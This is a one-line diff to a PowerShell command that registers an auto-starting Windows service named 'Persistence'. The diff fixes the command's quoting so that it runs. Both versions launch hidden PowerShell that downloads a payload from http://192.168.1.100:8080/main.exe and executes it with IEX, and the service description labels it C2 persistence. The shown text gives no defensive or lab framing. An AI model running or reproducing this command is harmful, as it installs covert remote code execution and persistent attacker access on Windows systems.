@@ -1,2 +1,1 @@
-New-Service -Name 'Persistence' -BinaryPathName 'C:\Windows\System32\cmd.exe /c powershell.exe -nop -w hidden -c IEX'
-(New-Object Net.WebClient).DownloadString(http://192.168.1.100:8080/main.exe)' -Description 'JmcaC2Persistence' -StartupType Automatic
+New-Service -Name 'Persistence' -BinaryPathName 'C:\Windows\System32\cmd.exe /c powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString("http://192.168.1.100:8080/main.exe")' -Description "JmcaC2Persistence" -StartupType "Automatic"
